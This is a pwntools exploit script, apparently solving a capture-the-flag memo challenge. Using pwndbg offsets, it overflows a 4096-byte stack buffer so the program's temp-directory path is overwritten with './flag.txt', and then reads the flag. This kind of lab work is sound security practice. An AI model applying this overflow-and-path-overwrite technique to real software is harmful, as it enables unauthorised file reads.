from pwn import *

'''
pwndbg> search "/tmp/cabbage"
[stack]         0x7fffffffcb40 '/tmp/cabbage.nBBFfN/memo.txt'
[stack]         0x7fffffffdb50 '/tmp/cabbage.nBBFfN'

pwndbg> p &buf
$4 = (char (*)[4096]) 0x7fffffffcb60

pwndbg> p 0x7fffffffdb50 - 0x7fffffffcb60
$5 = 4080

p tempdir
$11 = 0x7fffffffdb50 "/tmp/cabbage.GtAGGS" (in memo_w)
'''

offset_to_filename = 4080

target = process("./bin/ex1")

target.recvuntil(b"> ")
target.sendline(b"1")
target.recvuntil(b"Memo: ")
payload = b"a" * offset_to_filename + b"./flag.txt\0"
target.sendline(payload)

target.sendlineafter(b"> ", b"2")
target.interactive()